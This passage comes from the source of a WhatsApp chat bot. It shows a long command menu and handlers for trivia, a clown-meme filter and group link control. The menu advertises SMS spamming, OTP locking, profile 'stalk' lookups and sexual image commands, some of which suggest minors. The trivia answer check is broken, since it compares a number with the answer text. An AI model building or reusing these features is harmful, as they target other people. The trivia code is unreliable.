├❍ ${prefix} ᴘᴇʀɪᴏᴅɪᴄ-ᴛᴀʙʟʀ
├❍ ${prefix} ᴜɴᴘɪɴᴄʜᴀᴛ
├❍ ${prefix} ᴏᴄʀ
├❍ ${prefix} ᴄᴀʟᴄᴜʟᴀᴛᴏʀ
├❍ ${prefix} ғᴀᴄᴛ
├❍ ${prefix} ʜᴅᴠɪᴅᴇᴏ 
├❍ ${prefix} ᴄᴏɴᴠᴇʀᴛ 
├❍ ${prefix} converttimᴇ 
├❍ ${prefix} ʟɪsᴛᴄᴜʀʀᴇɴᴄʏ 
├❍ ${prefix} ᴄʀᴇᴀᴛᴇᴍᴇᴍᴇ
├❍ ${prefix} ᴘᴀssᴡᴏʀᴅ
├❍ ${prefix} ɢᴇᴛ
├❍ ${prefix} ʀᴇᴍɪɴᴅᴍᴇ
├❍ ${prefix} ᴡᴀɴᴜᴍɴᴇʀ 
├❍ ${prefix} sᴀᴠᴇ
├❍ ${prefix} ss
├❍ ${prefix} ᴄᴏᴜᴘʟᴇᴘᴘ
├❍ ${prefix} ᴇɴᴄʀʏᴘᴛ
├❍ ${prefix} ʟᴀɴɢᴜᴀɢᴇs 
├❍ ${prefix} ᴄʀᴇᴅɪᴛs
├❍ ${prefix} sᴜᴘᴘᴏʀᴛ 
├❍ ${prefix} ʀᴇᴘᴏsᴛ
├❍ ${prefix} vv2 
├❍ ${prefix} ᴛɪᴋᴛᴏᴋsᴇᴀʀᴄʜ 
├❍ ${prefix} ᴍᴏᴠɪᴇ
├❍ ${prefix} ᴠᴏʟᴠɪᴅ
├❍ ${prefix} ʀᴇᴍɪɴɪ 
├❍ ${prefix} ᴋᴅʀᴀᴍᴀ
├❍ ${prefix} channel 
├❍ ${prefix} ғʟɪᴘᴛᴇxᴛ
├❍ ${prefix} sᴘᴀᴍsᴍs
├❍ ${prefix} ᴡᴇᴀᴛʜᴇʀ
├❍ ${prefix} ᴍᴏᴅᴀᴘᴋ
├❍ ${prefix} ᴛᴇʀᴀʙᴏx
├❍ ${prefix} ᴛɪɴʏᴜʀʟ
├❍ ${prefix} sᴏᴜɴᴅ1-sᴏᴜɴᴅ161
├❍ ${prefix} ᴠᴏʟᴠɪᴅ
│
└ ❏


┌ ❏ 〤 *OWNER MENU* 〤
├❍   ᴄʜᴀᴛʙᴏᴛ <ᴏɴ/ᴏғғ>
├❍   ᴜᴘᴅᴀᴛᴇ
├❍   sʜᴜᴛᴅᴏᴡɴ
├❍   sᴇᴛʙɪᴏ 
├❍   ᴍᴏᴅᴇ-ᴘʀɪᴠᴀᴛᴇ
├❍   ᴍᴏᴅᴇ-ᴘᴜʙʟɪᴄ
├❍   ʀᴇᴘᴏʀᴛ
├❍   ᴄʟᴇᴀʀᴄʜᴀᴛ
├❍   sᴇᴛᴘᴘ 
├❍   ɢᴇᴛᴘᴘ
├❍   ʟɪsᴛʙʟᴏᴄᴋ
├❍   ʙʟᴏᴄᴋ
├❍   ᴜɴʙʟᴏᴄᴋ
├❍   ɢᴇᴛʙɪᴏ
├❍   ʀᴇsᴛᴀʀᴛ
├❍   ᴀɴᴛɪᴠɪᴇᴡᴏɴᴄᴇ  <ᴏɴ/ᴏғғ>
├❍   ᴀɴᴛɪᴅᴇʟᴇᴛᴇ  <ᴏɴ/ᴏғғ>
├❍   ᴀɴᴛɪᴄᴀʟʟ  <ᴏɴ/ᴏғғ>
├❍   ᴀᴜᴛᴏᴠɪᴇᴡsᴛᴀᴛᴜs  <ᴏɴ/ᴏғғ>
├❍   ᴀᴜᴛᴏʙɪᴏ  <ᴏɴ/ᴏғғ>  
├❍   ᴀᴜᴛᴏʀᴇᴀᴄᴛ <ᴏɴ/ᴏғғ>
├❍   ᴀᴜᴛᴏᴛʏᴘɪɴɢ    <ᴏɴ/ᴏғғ>
├❍   ᴀᴜᴛᴏʀᴇᴄᴏʀᴅɪɴɢ <ᴏɴ/ᴏғғ>
├❍   ᴀʟᴡᴀʏsᴏɴʟɪɴᴇ  <ᴏɴ/ᴏғғ>
├❍   ᴀᴜᴛᴏʀᴇᴀᴅ <ᴏɴ/ᴏғғ>
├❍   ᴜɴᴀᴠᴀɪʟᴀʙʟᴇ
├❍   ᴅᴇʟᴇᴛᴇ
├❍   ᴋɪᴄᴋ
├❍   ᴍᴏᴅᴇ
├❍   sᴜᴅᴏ
├❍   ᴅᴇʟsᴜᴅᴏ
├❍   $ 
├❍   =>
├❍   > 
├❍   ᴘʀᴇᴍɪᴜᴍ
├❍   ᴀᴅᴅᴄᴀꜱᴇ
├❍   ᴅᴇʟᴄᴀꜱᴇ
├❍   ʀᴇꜱᴛᴀʀᴛ
├❍   ꜱᴛᴏᴘ
└ ❏

┌ ❏ 〤 *ISLAM MENU* 〤
│
├❍ ${prefix} ᴅᴏᴀʜᴀʀɪᴀɴ
├❍ ${prefix} ᴋɪsᴀʜɴᴀʙɪ
├❍ ${prefix} sᴜʀᴀʜ
├❍ ${prefix} ᴊᴀᴅᴡᴀʟsʜᴏʟᴀᴛ
│
└ ❏

┌ ❏ 〤 *ANIME MENU* 〤
│
├❍ ${prefix} ʙʟᴜᴇᴀʀᴄʜɪᴠᴇ
├❍ ${prefix} animecharacter
├❍ ${prefix} ᴡᴀɪғᴜ
├❍ ${prefix} ǫᴜᴏᴛᴇsᴀɴɪᴍᴇ
├❍ ${prefix} ᴋɪʀʏᴜᴜ
├❍ ${prefix} 9animᴇ
├❍ ${prefix} ᴡᴇʙᴛᴏᴏɴ
├❍ ${prefix} ᴀᴋɪʀᴀ
├❍ ${prefix} ᴀᴋɪʏᴀᴍᴀ
├❍ ${prefix} animesearch 
├❍ ${prefix} anime ᴠɪᴅᴇᴏ
├❍ ${prefix} ᴀʀᴛ
├❍ ${prefix} ᴀsᴜɴᴀ
├❍ ${prefix} ᴀʏᴜᴢᴀᴡᴀ
├❍ ${prefix} ʙᴏʀᴜᴛᴏ
├❍ ${prefix} ʙᴛs
├❍ ${prefix} ᴄʜɪʜᴏ
├❍ ${prefix} ᴄᴏsᴘʟᴀʏ
├❍ ${prefix} ᴄᴏsᴘʟᴀʏʟᴏʟɪ
├❍ ${prefix} ᴄʏʙᴇʀ
├❍ ${prefix} ᴅᴇɪᴅᴇʀᴀ
├❍ ${prefix} ᴅᴏʀᴀᴇᴍᴏɴǫ
├❍ ${prefix} ᴇʟɪᴀɴᴀ
├❍ ${prefix} ᴇᴢʀᴀ
├❍ ${prefix} ᴇᴍɪʟɪᴀ
├❍ ${prefix} ᴇxᴏ
├❍ ${prefix} ɢᴀᴍᴇᴡᴀʟʟᴘᴀᴘᴇʀ
├❍ ${prefix} ɢʀᴇᴍᴏɴʏ
├❍ ${prefix} ʜᴀᴄᴋᴇʀ
├❍ ${prefix} ʜᴇsᴛɪᴀ
├❍ ${prefix} ʜɪɴᴀᴛᴀ
├❍ ${prefix} ʜᴜsʙᴜ
├❍ ${prefix} ɪɴᴏʀɪ
├❍ ${prefix} ɪsᴜᴢᴜ
├❍ ${prefix} ɪsʟᴀᴍɪᴄ
├❍ ${prefix} ɪᴛᴏʀɪ
├❍ ${prefix} ᴊᴇɴɴɪᴇ
├❍ ${prefix} ɪᴛᴀᴄʜɪ 
├❍ ${prefix} ᴊɪsᴏ
├❍ ${prefix} ᴊᴜsᴛɪɴᴀ
├❍ ${prefix} ᴋᴀɢᴀ
├❍ ${prefix} ᴋᴀɢᴜʀᴀ 
├❍ ${prefix} ᴋᴀᴋᴀsɪʜ
├❍ ${prefix} ᴄᴀʀᴛᴏᴏɴ
├❍ ${prefix} ᴋᴀᴏsʜɪ
├❍ ${prefix} sʜᴏʀᴛǫᴜᴏᴛᴇ
├❍ ${prefix} ᴋᴇɴᴇᴋɪ
├❍ ${prefix} ᴋᴏᴛᴏʀɪ
├❍ ${prefix} ᴋᴜʀᴜᴍɪ
├❍ ${prefix} ʟɪsᴀ
├❍ ${prefix} ᴍᴀᴅᴀʀᴀ
├❍ ${prefix} ᴍᴇɢᴜᴍɪɴ
├❍ ${prefix} ᴍɪᴄᴋʏ
├❍ ${prefix} ᴍɪᴋᴀsᴀ 
├❍ ${prefix} ᴍɪᴋᴜ
├❍ ${prefix} ɴᴀʀᴜᴛᴏ
├❍ ${prefix} ᴍᴇɴᴀᴛᴏ 
├❍ ${prefix} ᴍᴏᴜɴᴛᴀɪɴ 
├❍ ${prefix} ɴᴇᴋᴏ
├❍ ${prefix} ɴᴇᴋᴏᴍɪɴᴇ
├❍ ${prefix} ɴᴇᴢᴜᴋᴏ
├❍ ${prefix} ᴏɴᴇᴘᴇɪᴄᴇ 
├❍ ${prefix} ᴘᴏᴋᴇᴍᴏɴ 
├❍ ${prefix} ᴘʀᴏɢʀᴀᴍᴍɪɴɢ 
├❍ ${prefix} ᴘᴇɴᴛᴏʟ
├❍ ${prefix} ʀᴀɴᴅᴏᴍɴɪᴍᴇ
├❍ ${prefix} ʀᴀɴᴅᴏᴍɴɪᴍᴇ2
├❍ ${prefix} ʀɪᴢᴇ
├❍ ${prefix} ʀᴏsᴇ
├❍ ${prefix} sᴀɢɪʀɪ
├❍ ${prefix} sᴀᴋᴜʀᴀ
├❍ ${prefix} sᴀᴛᴀɴɪᴄ 
├❍ ${prefix} sasukᴇ
├❍ ${prefix} sʜɪɴᴀɴ
├❍ ${prefix} sʜɪɴᴋᴀ
├❍ ${prefix} sʜᴏᴛᴀ
├❍ ${prefix} sᴘᴀᴄᴇ
├❍ ${prefix} ᴛᴇᴄʜɴᴏʟᴏɢʏ
├❍ ${prefix} ᴛᴇᴊɪɴᴀ
├❍ ${prefix} ᴛᴏᴜᴋᴀᴄʜᴀɴ
├❍ ${prefix} ᴛsᴜɴᴀᴅᴇ 
├❍ ${prefix} ʏᴏᴛsᴜʙᴀ
├❍ ${prefix} ʏᴜᴋɪ
├❍ ${prefix} ʏᴜᴍᴇᴋᴏ 
├❍ ${prefix} ʏᴜʟɪʙᴏᴄɪʟ
│
└ ❏

┌ ❏ 〤 *NSFW MENU* 〤
├❍ ${prefix} ɢᴇɴsʜɪɴ
├❍ ${prefix} sᴡɪᴍsᴜɪᴛ 
├❍ ${prefix} sᴄʜᴏᴏʟsᴡɪᴍsᴜɪᴛ
├❍ ${prefix} ᴡʜɪᴛᴇ 
├❍ ${prefix} ʙᴀʀᴇғᴏᴏᴛ 
├❍ ${prefix} ᴛᴏᴜʜᴏᴜ 
├❍ ${prefix} ɢᴀᴍᴇᴄɢ 
├❍ ${prefix} ʜᴏʟᴏʟɪᴠᴇ 
├❍ ${prefix} ᴜɴᴄᴇɴsᴏʀᴇᴅ 
├❍ ${prefix} sᴜɴɢɢʟᴀssᴇs 
├❍ ${prefix} ɢʟᴀssᴇs
├❍ ${prefix} ᴡᴇᴀᴘᴏɴ 
├❍ ${prefix} sʜɪʀᴛʟɪғᴛ
├❍ ${prefix} ᴄʜᴀɪɴ 
├❍ ${prefix} ғɪɴɢᴇʀɪɴɢ 
├❍ ${prefix} ғʟᴀᴛᴄʜᴇsᴛ 
├❍ ${prefix} ᴛᴏʀɴᴄʟᴏᴛʜ 
├❍ ${prefix} ʙᴏɴᴅᴀɢᴇ 
├❍ ${prefix} ᴅᴇᴍᴏɴ
├❍ ${prefix} ᴘᴀɴᴛʏᴘᴜʟʟ 
├❍ ${prefix} ʜᴇᴀᴅᴘʜᴏɴᴇ 
├❍ ${prefix} ʜᴇᴀᴅᴅʀᴇss 
├❍ ${prefix} ᴀɴᴜsᴠɪᴇᴡ
├❍ ${prefix} sʜᴏʀᴛs 
├❍ ${prefix} sᴛᴏᴋɪɴɢs 
├❍ ${prefix} ᴛᴏᴘʟᴇss 
├❍ ${prefix} ʙᴇᴀᴄʜ 
├❍ ${prefix} ʙᴜɴɴʏɢɪʀʟ 
├❍ ${prefix} ʙᴜɴɴʏᴇᴀʀ 
├❍ ${prefix} ᴠᴀᴍᴘɪʀᴇ 
├❍ ${prefix} ʙɪᴋɪɴɪ 
├❍ ${prefix} ɴᴏʙʀᴀ
├❍ ${prefix} ᴡʜɪᴛᴇʜᴀɪʀ 
├❍ ${prefix} ʙʟᴏɴᴅᴇ 
├❍ ${prefix} ᴘɪɴᴋʜᴀɪʀ 
├❍ ${prefix} ʙᴇᴅ 
├❍ ${prefix} ᴘᴏɴʏᴛᴀɪʟ 
├❍ ${prefix} ɴᴜᴅᴇ 
├❍ ${prefix} ᴅʀᴇss 
├❍ ${prefix} ᴜɴᴅᴇʀᴡᴇᴀʀ 
├❍ ${prefix} ᴜɴɪғᴏʀᴍ
├❍ ${prefix} ғᴏxɢɪʀʟ 
├❍ ${prefix} sᴋɪʀᴛ 
├❍ ${prefix} ʙʀᴇᴀsᴛ 
├❍ ${prefix} ᴛᴡɪɴᴛᴀɪʟ 
├❍ ${prefix} sᴘʀᴇᴀᴅᴘᴜssʏ 
├❍ ${prefix} sᴇᴇᴛʜʀᴏᴜɢʜ 
├❍ ${prefix} ʙʀᴇᴀsᴛʜᴏʟᴅ 
├❍ ${prefix} ғᴀᴛᴇsᴇʀɪᴇs 
├❍ ${prefix} sᴘʀᴇᴀᴅʟᴇɢs 
├❍ ${prefix} ᴏᴘᴇɴsʜɪʀᴛ 
├❍ ${prefix} ʜᴇᴀᴅʙᴀɴᴅ 
├❍ ${prefix} ɴɪᴘᴘʟᴇs 
├❍ ${prefix} ᴇʀᴇᴄᴛɴɪᴘᴘʟᴇs 
├❍ ${prefix} ɢʀᴇᴇɴʜᴀɪʀ 
├❍ ${prefix} ᴡᴏʟғɢɪʀʟ 
└ ❏

┌ ❏ 〤 *REACTIONS MENU* 〤
├❍ ${prefix}  ᴋɪʟʟ
├❍ ${prefix}  ᴘᴀᴛ
├❍ ${prefix}  ʟɪᴄᴋ
├❍ ${prefix}  ʙɪᴛᴇ
├❍ ${prefix}  ʏᴇᴇᴛ
├❍ ${prefix}  ʙᴏɴᴋ
├❍ ${prefix}  ᴡɪɴᴋ
├❍ ${prefix}  ᴘᴏᴋᴇ
├❍ ${prefix}  ɴᴏᴍ
├❍ ${prefix}  sʟᴀᴘ
├❍ ${prefix}  sᴍɪʟᴇ
├❍ ${prefix}  ᴡᴀᴠᴇ
├❍ ${prefix}  ʙʟᴜsʜ
├❍ ${prefix}  sᴍᴜɢ
├❍ ${prefix}  ɢʟᴏᴍᴘ
├❍ ${prefix}  ʜᴀᴘᴘʏ
├❍ ${prefix}  ᴅᴀɴᴄᴇ
├❍ ${prefix}  ᴄʀɪɴɢᴇ
├❍ ${prefix}  ʜɪɢʜғɪᴠᴇ
└ ❏,

┌ ❏ 〤 *GAME MENU* 〤
│
├❍ ${prefix} ᴄʟᴀɴ
├❍ ${prefix} ᴡᴇʀᴇᴡᴏʟғ
├❍ ${prefix} ᴡᴀʀ
├❍ ${prefix} ᴍsᴘ
├❍ ${prefix} ᴜɴᴏ
├❍ ${prefix} ɢɪᴠᴇᴀᴡᴀʏ
├❍ ${prefix} ʙʟᴀᴄᴋᴊᴀᴄᴋ
├❍ ${prefix} ᴛɪᴄᴛᴀᴄᴛᴏᴇ
├❍ ${prefix} ᴡʀɢ
├❍ ${prefix} ᴡᴄɢ
└ ❏

┌ ❏ 〤 *USER MENU* 〤
│
├❍ ${prefix} ᴀғᴋ
├❍ ${prefix} sᴇʀᴠᴇʀ
├❍ ${prefix} ᴅɪsᴋ
├❍ ${prefix} ʟᴏᴏᴋᴜᴘ
├❍ ${prefix} ᴘɪɴɢ
├❍ ${prefix} ᴀʟɪᴠᴇ
├❍ ${prefix} sʏsᴛᴇᴍ 
├❍ ${prefix} ᴅɪsᴋ
├❍ ${prefix} ʀuntime 
│
└ ❏

┌ ❏ 〤 *FUN MENU* 〤
│
├❍ ${prefix} ᴛᴏᴘ
├❍ ${prefix} ғᴀᴄᴛ
├❍ ${prefix} ғʟɪᴘᴄᴏɪɴ
├❍ ${prefix} ʀᴀᴛᴇ
├❍ ${prefix} ʀɪᴢᴢ
├❍ ${prefix} ғʟɪʀᴛ
├❍ ${prefix} ᴘɪᴄᴋᴜᴘʟɪɴᴇ
├❍ ${prefix} ᴊᴏᴋᴇ
├❍ ${prefix} sʜɪᴘ
├❍ ${prefix} ᴅᴀʀᴇ
├❍ ${prefix} ᴛʀᴜᴛʜ
├❍ ${prefix} ᴛʀɪᴠɪᴀ
├❍ ${prefix} ᴀɴsᴡᴇʀ
├❍ ${prefix} sᴄᴏʀᴇʙᴏᴀʀᴅ
├❍ ${prefix} ʜᴏʀᴏsᴄᴏᴘᴇ
├❍ ${prefix} sᴛᴜᴘɪᴅᴄʜᴇᴄᴋ
├❍ ${prefix} ɢᴀʏᴄʜᴇᴄᴋ
├❍ ${prefix} ᴡᴀɪғᴜᴄʜᴇᴄᴋ
├❍ ${prefix} ʜᴏᴛᴄʜᴇᴄᴋ 
├❍ ${prefix} ᴜɴᴄʟᴇᴀɴᴄʜᴇᴄᴋ
├❍ ${prefix} ᴇᴠɪʟᴄʜᴇᴄᴋ
├❍ ${prefix} smarᴛ ᴄʜᴇᴄᴋ
├❍ ${prefix} sᴏᴜʟᴍᴀᴛᴇ <ᴛᴀɢ>
├❍ ${prefix} ᴄᴏᴜᴘʟᴇ <ᴛᴀɢ>
├❍ ${prefix} ᴡʜᴀᴛ
├❍ ${prefix} ᴡʜᴇʀᴇ
├❍ ${prefix} ᴡʜᴇɴ
├❍ ${prefix} ɪs
│
└ ❏

┌ ❏ 〤 *VOICE CHANGER MENU* 〤
│
├❍ ${prefix} ʙᴀss
├❍ ${prefix} ʙʟᴏᴡɴ
├❍ ${prefix} ᴅᴇᴇᴘ
├❍ ${prefix} ᴇᴀʀʀᴀᴘᴇ
├❍ ${prefix} ғᴀsᴛ
├❍ ${prefix} ғᴀᴛ
├❍ ${prefix} ɴɪɢʜᴛᴄᴏʀᴇ
├❍ ${prefix} ʀᴇᴠᴇʀsᴇ
├❍ ${prefix} ʀᴏʙᴏᴛ
├❍ ${prefix} sʟᴏᴡ
├❍ ${prefix} sᴍᴏᴏᴛʜ
├❍ ${prefix} sǫᴜɪʀʀᴇʟ
└ ❏


┌ ❏ 〤 *GROUP MENU* 〤
├❍ ${prefix} ᴀᴅᴅ <ᴛᴀɢs>
├❍ ${prefix} ᴋɪᴄᴋ <ᴛᴀɢs>
├❍ ${prefix} ᴇᴠᴇʀʏᴏɴᴇ 
├❍ ${prefix} ᴛᴀɢᴀʟʟ 
├❍ ${prefix} ʟᴇᴀᴠᴇɢᴄ
├❍ ${prefix} ᴊᴏɪɴ
├❍ ${prefix} ɪɴᴠɪᴛᴇ 
├❍ ${prefix} ɢᴇᴛɴᴀᴍᴇ 
├❍ ${prefix} ɢᴇᴛᴅᴇsᴋɢᴄ
├❍ ${prefix} ɢᴇᴛᴘᴘɢᴄ
├❍ ${prefix} sᴇᴛᴘᴘɢᴄ
├❍ ${prefix} sᴠᴄᴏɴᴛᴀᴄᴛ
├❍ ${prefix} ʟɪsᴛᴏɴʟɪɴᴇ 
├❍ ${prefix} ᴏᴘᴇɴɢʀᴏᴜᴘ 
├❍ ${prefix} ᴄʟᴏsᴇɢʀᴏᴜᴘ 
├❍ ${prefix} ʟɪɴᴋɢᴄ
├❍ ${prefix} ʀᴇsᴇᴛʟɪɴᴋ
├❍ ${prefix} ᴄʀᴇᴀᴛᴇɢᴄ
├❍ ${prefix} ʜɪᴅᴇᴛᴀɢ 
├❍ ${prefix} ᴀɴᴛɪʟɪɴᴋ 
├❍ ${prefix} ᴀɴᴛɪʟɪɴᴋ-ᴋɪᴄᴋ <ᴏɴ/ᴏғғ>
├❍ ${prefix} ᴀɴᴛɪʟɪɴᴋ-ᴅᴇʟᴇᴛᴇ <ᴏɴ/ᴏғғ>
├❍ ${prefix} ᴘʀᴏᴍᴏᴛᴇ <ᴛᴀɢs>
├❍ ${prefix} ᴅᴇᴍᴏᴛᴇ <ᴛᴀɢs>
│
└ ❏

┌ ❏ 〤 *SPECIAL MENU* 〤
│
├❍ ${prefix} ʟᴏᴄᴋᴏᴛᴘ
├❍ ${prefix} ᴀɴᴛɪʙᴜɢ
├❍ ${prefix} xxxsᴇᴀʀᴄʜ
├❍ ${prefix} xxxᴅᴏᴡɴʟᴏᴀᴅ
├❍ ${prefix} xɴxxsᴇᴀʀᴄʜ
├❍ ${prefix} xɴxxᴅᴏᴡɴʟᴏᴀᴅ
├❍ ${prefix} ʜᴇɴᴛᴀɪ
├❍ ${prefix} ᴛᴇxᴛ2ᴘᴅғ
└ ❏

┌ ❏ 〤 *PHOXY MENU* 〤
│
├❍ ${prefix} sʜᴀᴅᴏᴡ
├❍ ${prefix} ʀᴏᴍᴀɴᴛɪᴄ
├❍ ${prefix} ᴡʀɪᴛᴇ
├❍ ${prefix} ʙᴜʀɴᴘᴀᴘᴇʀ
├❍ ${prefix} sᴍᴏᴋᴇ 
├❍ ${prefix} ɴᴀʀᴜᴛᴏʙᴀɴɴᴇʀ
├❍ ${prefix} ʟᴏᴠᴇ
├❍ ${prefix} ᴜɴᴅᴇʀɢʀᴀss
├❍ ${prefix} ᴅᴏᴜʙʟᴇʟᴏᴠᴇ
├❍ ${prefix} ᴄᴏғғᴇᴇᴄᴜᴘ
├❍ ${prefix} ᴜɴᴅᴇʀᴡᴀᴛᴇʀᴏᴄᴇᴀɴ
├❍ ${prefix} sᴍᴏᴋʏɴᴇᴏɴ
├❍ ${prefix} sᴛᴀʀᴛᴇxᴛs
├❍ ${prefix} ʙᴀʟʟᴏɴᴛᴇxᴛs
├❍ ${prefix} ʀᴀɪɴʙᴏᴡᴇғғᴇᴄᴛ
├❍ ${prefix} ᴍᴇᴛᴀʟʟɪᴄᴇғғᴇᴄᴛ
├❍ ${prefix} ᴇᴍʙʀᴏɪᴅᴇʀʏᴛᴇxᴛs
├❍ ${prefix} sᴛᴏɴᴇᴛᴇxᴛs
├❍ ${prefix} ғʟᴀᴍɪɴɢᴛᴇxᴛ
├❍ ${prefix} ᴡʀɪᴛᴇᴀʀᴛs
├❍ ${prefix} sᴜᴍᴍᴇʀᴛᴇxᴛs
├❍ ${prefix} ɴᴀᴛᴜʀᴇ3ᴅᴛᴇxᴛs
├❍ ${prefix} ʀᴏsᴇsᴛᴇxᴛs
├❍ ${prefix} ᴡᴏʟғᴍᴇᴛᴀʟᴛᴇxᴛs
├❍ ${prefix} ɴᴀᴛᴜʀᴀʟᴛʏᴘᴏɢʀᴀᴘʜʏ 
├❍ ${prefix} sʜɪɴᴇᴛᴇxᴛs
├❍ ${prefix} ǫᴜᴏᴛᴇsᴜɴᴅᴇʀ
└ ❏

┌ ❏ 〤 *STALK MENU* 〤
│
├❍ ${prefix} ɢɪᴛʜᴜʙsᴛᴀʟᴋ
├❍ ${prefix} ɪɢsᴛᴀʟᴋ
├❍ ${prefix} ᴛɪᴋᴛᴏᴋsᴛᴀʟᴋ
│
└ ❏

┌ ❏ 〤 *PHOTO MENU〤
│
├❍ ${prefix} ɢʟɪᴛᴄʜᴛᴇxᴛ
├❍ ${prefix} ᴡʀɪᴛᴇᴛᴇxᴛ 
├❍ ${prefix} ᴀᴅᴠᴀɴᴄᴇᴅɢʟᴏᴡ
├❍ ${prefix} ᴛʏᴘᴏɢʀᴀᴘʜʏᴛᴇxᴛ
├❍ ${prefix} ᴘɪxᴇʟɢʟɪᴛᴄʜ
├❍ ${prefix} ɴᴇᴏɴɢʟɪᴛᴄʜ 
├❍ ${prefix} ғʟᴀɢᴛᴇxᴛ
├❍ ${prefix} ғʟᴀɢ3ᴅᴛᴇxᴛ
├❍ ${prefix} ᴅᴇʟᴇᴛɪɴɢᴛᴇxᴛ
├❍ ${prefix} ʙʟᴀᴄᴋᴘɪɴᴋsᴛʏʟᴇ
├❍ ${prefix} ɢʟᴏᴡɪɴɢᴛᴇxᴛ
├❍ ${prefix} ᴜɴᴅᴇʀᴡᴀᴛᴇʀ ᴛᴇxᴛ
├❍ ${prefix} ʟᴏɢᴏᴍᴀᴋᴇʀ 
├❍ ${prefix}ᴄᴀʀᴛᴏᴏɴsᴛʏʟᴇ
├❍ ${prefix} ᴘᴀᴘᴇʀᴄᴜᴛsᴛʏʟᴇ
├❍ ${prefix} ᴡᴀᴛᴇʀᴄᴏʟᴏʀᴛᴇxᴛ
├❍ ${prefix} ᴇғғᴇᴄᴛᴄʟᴏᴜᴅ
├❍ ${prefix} ʙʟᴀᴄᴋᴘɪɴᴋʟᴏɢᴏ
├❍ ${prefix} ɢʀᴀᴅɪᴇɴᴛᴛᴇxᴛ
├❍ ${prefix} ʟᴜxᴜʀʏɢᴏʟᴅ
├❍ ${prefix} sᴀɴᴅsᴜᴍᴍᴇʀ
├❍ ${prefix} ᴍᴜʟᴛɪᴄᴏʟᴏʀᴇᴅɴᴇᴏɴ
├❍ ${prefix} ᴍᴀᴋɪɴɢɴᴇᴏɴ
├❍ ${prefix} ɢᴀʟᴀxʏᴡᴀʟʟᴘᴀᴘᴇʀ
├❍ ${prefix} 1917stylᴇ
├❍ ${prefix} ғʀᴇᴇᴄʀᴇᴀᴛᴇ
├❍ ${prefix} ɢᴀʟᴀxʏsᴛʏʟᴇ
├❍ ${prefix} ʟɪɢʜᴛᴇғғᴇᴄᴛs
└ ❏
	*〤 ${global.anitav4} 〻*`)
        break
 


case 'antilink': {
    // React with a lock emoji
    await David.sendMessage(m?.chat, { react: { text: `🔒`, key: m?.key } });

    if (!m.isGroup) return reply('Group only.');
    if (!isBotAdmins) return reply('Bot is not yet an admin.');
    if (!isAdmins) return reply('This command is for group admins only.');

    // Send a reply instructing the user on how to use the command
    await m.reply(`*_Please provide a valid instruction_*\n\n*Examples:*\n- antilink-kick on/off\n- antilink-delete on/off\n- antilink-warn on/off`);
}
break;


case 'clown': {
    // Ensure the command is a reply to an image or targets a user
    if (!/image/.test(mime) && !mentionedJid.length) {
        return reply(`*REQUEST ERROR!! MESSAGE :*\n\n> *Reply to an image or mention a user with .clown to create a clown meme*`);
    }

    try {
        let imageUrl;

        // If it's a reply to an image, download and upload it
        if (/image/.test(mime)) {
            const mediaPath = await David.downloadAndSaveMediaMessage(quoted);
            const uploadResponse = await uploadToImgur(mediaPath); // Use the Imgur upload function
            if (uploadResponse.status !== "success") {
                fs.unlinkSync(mediaPath); // Clean up the downloaded file
                return reply(`*UPLOAD ERROR!! MESSAGE :*\n\n> ${uploadResponse.message}`);
            }
            imageUrl = uploadResponse.fileUrl; // Get the uploaded image URL
            fs.unlinkSync(mediaPath); // Clean up the downloaded file
        } else if (mentionedJid.length) {
            // If a user is mentioned, fetch their profile picture
            const userJid = mentionedJid[0];
            imageUrl = await David.profilePictureUrl(userJid, 'image').catch(() => 'https://cdn.popcat.xyz/avatar.png');
        } else {
            return reply(`*REQUEST ERROR!! MESSAGE :*\n\n> *Reply to an image or mention a user with .clown to create a clown meme*`);
        }

        // Call the Clown API
        const apiResponse = await axios.get(`https://api.popcat.xyz/clown`, {
            params: { image: imageUrl }
        });

        if (apiResponse.status === 200) {
            const clownImageUrl = apiResponse.request.res.responseUrl; // The URL of the clown meme

            // Send the clown meme back to the user
            await David.sendMessage(m.chat, {
                image: { url: clownImageUrl },
                caption: `*ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅᴀᴠɪᴅ ᴄʏʀɪʟ ᴛᴇᴄʜ* `
            }, { quoted: m });
        } else {
            reply(`*CLOWN MEME ERROR!! MESSAGE :*\n\n> Failed to generate a clown meme. Try again.`);
        }
    } catch (error) {
        console.error('Error in Clown command:', error);
        reply(`*AN ERROR OCCURRED!! MESSAGE :*\n\n> ${error.message}`);
    }
    break;
}

 
  case 'hobbycheck': case 'cekhobby':
const hobby = text
const hob =['Cooking','Helping Grandpa','Mabar','Nobar','Sosmedtan','Helping Others','Watching Anime','Watching Korean Drama','Riding a Motorcycle','Singing','Dancing','Colliding','Drawing','Taking Unclear Photos','Playing Games','Talking to Myself']
const by = hob[Math.floor(Math.random() * hob.length)]
David.sendMessage(from, { text: 'Question : *'+hobby+'*\n\nAnswer : '+ by}, { quoted: m })
break

case 'trivia': {
    try {
        const response = await axios.get('https://opentdb.com/api.php?amount=1&type=multiple');
        const trivia = response.data.results[0];

        const question = trivia.question;
        const options = [...trivia.incorrect_answers, trivia.correct_answer];
        const correctAnswer = trivia.correct_answer;

        // Shuffle options to avoid pattern (correct answer always in last)
        options.sort(() => Math.random() - 0.5);

        // Save the correct answer
        global.triviaAnswer = correctAnswer;

        // Send the question and options to the chat
        await David.sendMessage(m.chat, {
            text: `*Trivia Time!*\n\nQuestion: ${question}\n\nOptions: \n1. ${options[0]}\n2. ${options[1]}\n3. ${options[2]}\n4. ${options[3]}\n\nWhat's your answer? (Reply with .answer <number>)`
        }, { quoted: m });
    } catch (error) {
        console.error(error);
        reply('Sorry, I couldn\'t fetch a trivia question right now. Please try again later.');
    }
    break;
}

case 'scoreboard': {
    // Retrieve and show the leaderboard
    const leaderboard = global.triviaScores; // Assuming the scores are stored in global.triviaScores
    let leaderboardMessage = '*Trivia Leaderboard:*\n\n';
    
    leaderboard.forEach((player, index) => {
        leaderboardMessage += `${index + 1}. ${player.name} - ${player.score} points\n`;
    });

    await David.sendMessage(m.chat, {
        text: leaderboardMessage
    });

    break;
}

case 'answer': {
    // Make sure the answer is a valid option (1, 2, 3, 4)
    const answer = parseInt(args[0]);

    if (![1, 2, 3, 4].includes(answer)) {
        return reply('Please respond with a number between 1 and 4!');
    }

    const userAnswer = global.triviaAnswer;
    let resultMessage = '';
    
    // Check if the answer is correct or incorrect
    if (answer === userAnswer) {
        resultMessage = 'Correct! 🎉';
        // You can increment user's score here (store it globally or in a database)
    } else {
        resultMessage = `Incorrect! 😞 The correct answer was option ${userAnswer}.`;
    }

    await David.sendMessage(m.chat, {
        text: `*Answer Result:*\n\n${resultMessage}`
    });

    break;
}






case 'blur': {
